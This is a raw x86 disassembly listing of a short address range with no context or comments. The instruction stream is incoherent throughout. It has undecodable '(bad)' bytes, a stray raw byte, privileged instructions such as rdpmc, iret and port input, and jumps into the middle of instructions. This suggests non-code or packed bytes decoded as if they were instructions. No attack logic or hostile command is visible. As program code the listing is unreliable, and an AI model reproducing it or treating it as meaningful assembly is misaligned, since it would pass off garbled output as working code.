  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
